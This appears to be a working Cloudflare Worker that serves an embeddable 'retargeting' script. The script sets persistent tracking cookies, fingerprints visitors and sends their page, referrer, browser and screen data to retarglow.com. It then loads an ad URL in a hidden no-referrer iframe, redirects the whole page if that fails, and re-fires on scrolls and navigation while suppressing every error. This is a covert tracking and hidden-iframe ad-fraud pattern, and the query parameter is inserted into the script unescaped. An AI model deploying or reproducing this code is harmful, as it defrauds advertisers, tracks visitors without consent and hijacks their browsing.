export default {
  async fetch(request) {
    const headers = {
      "Content-Type": "application/javascript",
      "Access-Control-Allow-Origin": "*"
    };

    const url = new URL(request.url);
    const cid = url.searchParams.get("cid") || "default";

    const js = `(function(){
  try {
    const c="${cid}", _r = localStorage.getItem("_r") || crypto.randomUUID();
    localStorage.setItem("_r", _r);
    document.cookie = "_r=" + _r + ";path=/;max-age=2592000;SameSite=Lax";
    document.cookie = "smc_uid=" + _r + ";path=/;max-age=31536000;SameSite=Lax";
    document.cookie = "user_id_t=" + _r + ";path=/;max-age=31536000;SameSite=Lax";

    let vc = 1;
    try {
      const match = document.cookie.match(/(?:^|;\\s*)visit_ct=(\\d+)/);
      vc = match ? parseInt(match[1]) + 1 : 1;
    } catch {}
    document.cookie = "visit_ct=" + vc + ";path=/;max-age=31536000;SameSite=Lax";

    document.cookie = "page_refreshed=true;path=/;max-age=86400;SameSite=Lax";

    const isShopify = !!document.querySelector('script[src*="cdn.shopify.com"], link[href*="cdn.shopify.com"]');

    const u = location.href, r = document.referrer, n = navigator.userAgent;
    const b = n.includes("Chrome") ? "C" : n.includes("Firefox") ? "F" : n.includes("Safari") ? "S" : "U";
    const d = /Mobi|Android/i.test(n) ? "M" : "D";
    const o = navigator.platform;
    const s = screen.width + "x" + screen.height;
    const domain = location.hostname;

    const p = {
      cid: c,
      u,
      r,
      ua: n,
      dt: d,
      b,
      os: o,
      sr: s,
      cm: { _r },
      domain,
      visit_ct: vc,
      page_refreshed: true,
      shopify: isShopify
    };

    try {
      fetch("https://retarglow.com/log", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(p),
        keepalive: true
      }).catch(() => {});
    } catch {}

    let triggered = false;
    let lastInjectedAt = 0;
    const sessionKey = "i_" + _r + "_" + location.pathname;
    const once = sessionStorage.getItem(sessionKey);

    function injectIframe(adUrl) {
      const iframe = document.createElement("iframe");
      iframe.style.display = "none";
      iframe.referrerPolicy = "no-referrer";
      iframe.src = adUrl.replace("{{_r}}", encodeURIComponent(_r));
      iframe.onerror = () => {
        try {
          const img = new Image();
          img.src = adUrl;
          setTimeout(() => { window.location.href = adUrl; }, 300);
        } catch {}
      };
      document.body.appendChild(iframe);
    }

    function fetchServeWithTimeout(body, timeoutMs) {
      const controller = new AbortController();
      const tid = setTimeout(() => controller.abort(), timeoutMs);
      return fetch("https://retarglow.com/serve", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(body),
        signal: controller.signal
      })
      .then(res => {
        if (!res.ok) throw new Error("Serve request failed: " + res.status);
        return res.text();
      })
      .then(txt => {
        try { return JSON.parse(txt); } catch { return null; }
      })
      .finally(() => clearTimeout(tid));
    }

    function backoffDelayMs(attempt, base=600, max=4000) {
      // exponential: base * 2^attempt + jitter(0..250ms), clamped to max
      const exp = Math.min(base * Math.pow(2, attempt), max);
      const jitter = Math.floor(Math.random() * 250);
      return exp + jitter;
    }

    function serveWithRetry(maxTries = 3) {
      let attempt = 0;

      const tryOnce = () => {
        return fetchServeWithTimeout({ u, cm: { _r }, cid: c }, 4000)
          .then(j => {
            if (j && j.ad_url) {
              injectIframe(j.ad_url);
              return true; // success
            }
            throw new Error("No ad_url in response");
          })
          .catch(() => {
            attempt++;
            if (attempt >= maxTries) return false; // give up quietly
            return new Promise(resolve => {
              setTimeout(() => resolve(tryOnce()), backoffDelayMs(attempt));
            });
          });
      };

      return tryOnce().catch(() => false); // hard contain
    }

    const inject = () => {
      const now = Date.now();
      if (triggered || once || now - lastInjectedAt < 1000) return;
      triggered = true;
      lastInjectedAt = now;
      sessionStorage.setItem(sessionKey, "1");

      serveWithRetry(3).then(ok => {
        if (!ok) {
          triggered = false;
          sessionStorage.removeItem(sessionKey);
        }
      }).catch(() => {
        triggered = false;
        sessionStorage.removeItem(sessionKey);
      });
    };

    setTimeout(inject, 2000);
    window.addEventListener("scroll", () => { inject(); window.removeEventListener("scroll", inject); });
    setTimeout(inject, 5000);

    ["pushState", "replaceState"].forEach(fn => {
      const orig = history[fn];
      if (!orig) return;
      history[fn] = function () {
        const r = orig.apply(this, arguments);
        triggered = false;
        sessionStorage.removeItem(sessionKey);
        setTimeout(inject, 1500);
        return r;
      };
    });

    window.addEventListener("popstate", () => {
      triggered = false;
      sessionStorage.removeItem(sessionKey);
      setTimeout(inject, 1500);
    });

    let lastUrl = location.href;
    const mo = new MutationObserver(() => {
      if (location.href !== lastUrl) {
        lastUrl = location.href;
        triggered = false;
        sessionStorage.removeItem(sessionKey);
        setTimeout(inject, 1500);
      }
    });
    mo.observe(document, { childList: true, subtree: true });

  } catch (e) {}
})();`;

    return new Response(js, { status: 200, headers });
  }
};
